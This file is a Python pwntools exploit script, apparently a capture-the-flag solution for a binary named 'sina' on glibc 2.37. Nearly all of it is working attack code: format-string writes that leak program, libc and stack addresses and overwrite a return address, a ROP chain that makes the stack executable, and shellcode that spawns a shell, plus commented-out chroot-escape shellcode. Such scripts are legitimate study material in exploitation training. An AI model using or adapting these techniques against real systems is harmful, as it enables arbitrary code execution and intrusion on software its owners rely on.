#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

exe = ELF("sina_patched")
libc = ELF("/home/yrl/glibc-all-in-one/libs/2.37-0ubuntu2_amd64/libc.so.6")
ld = ELF("/home/yrl/glibc-all-in-one/libs/2.37-0ubuntu2_amd64//ld-linux-x86-64.so.2")

# shortcuts
def logbase(): print("libc base = %#x" % libc.address)
def logleak(name, val):  print(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "206.189.113.236", "30674"

limit=0

while True:
  p = process("./sina")
  limit=2
  # use _dl_fini link_map trick to return to main and leak addresses for libc,main, stack
  payload1 = '%8c%32$hhn.%1$p..%3$p..%13$p.'
  sl(payload1.ljust(0x3f,' '))
  exe.address = int(rcu('.0x', '.'),16)-0x4040
  logleak('prog base', exe.address)
  libc.address = int(rcu('.', '.'),16)-0x10b941
  logbase()
  stack = int(rcu('.', '.'),16) - 0x110
  logleak('stack', stack)
  # we wait the libc ASLR lower 32bits are small , to no receive gigabytes of data back
  if (((libc.address>>24) & 0xff)>limit):
    p.sendline('%p')
  else:
    break

# set stack address for overwriting return address, and do a second ret2main
low1 = ((exe.address+0x1159)-0x11b8)&0xffff
low2 = ((stack-0x100+0x10) & 0xffff)
if (low1<low2):
  sl('%'+str(low1)+'c%8$hn%'+str(low2-low1)+'c%35$hnXY%p')
else:
  sl('%'+str(low2)+'c%35$hn%'+str(low1-low2)+'c%8$hnXY%p')


pause()
p.recvuntil('XY0x' , drop=True)

# gdb.attach(p)
pause()
# replace return address by gets() function,  we will send the next payload via gets
low3 = (libc.sym['gets']) & 0xffffffff
print('low3 = '+hex(low3))
payload1 = '%'+str(low3)+'c%73$nPIPO%p'
context.log_level = 'info'
p.sendline(payload1.ljust(0x3f,' '))
p.recvuntil(b'PIPO0x' , drop=True)
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
add_eax_3 = libc.address + 0x00000000000ce298 # add eax, 3 ; ret
gadget_ret = pop_rdi + 1 # ret

print('pop_rdi breakpoint = '+hex(pop_rdi))
print('gadget_ret = '+hex(gadget_ret))

pause()

payload = b''
payload += p64(gadget_ret)*(0x208>>3)
stack2 = stack-0x90

# # put shellcode at end of ROP, map stack rwx, and execute the shellcode to exit chroot
# offset = 33
# # map stack rwx and jump to shellcode (with a nopsled for security)
payload += p64(pop_rdi)+p64(stack2 & 0xfffffffffffff000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)+p64(pop_rax)+p64(7)+p64(add_eax_3)+p64(syscall)+p64(stack2+(17*8))
# payload += b'\x90'*128+asm("".join(
#   [
#     shellcraft.mkdir("lol", 0o755), 
#     shellcraft.chroot("lol"), 
#     shellcraft.chroot("../../../../../../../../../../../../../../../.."), 
#     shellcraft.sh()
#   ]))

payload += b'\x90'*128+asm("".join(
  [
    # shellcraft.mkdir("lol", 0o755), 
    # shellcraft.chroot("lol"), 
    # shellcraft.chroot("../../../../../../../../../../../../../../../.."), 
    shellcraft.sh()
  ]))

# # escape 0x7f for remote payload, because of qemu or strace...
# payloadc = b''
# for c in payload:
#   payloadc += b'\x16'+c

p.sendline(payload)

p.interactive()
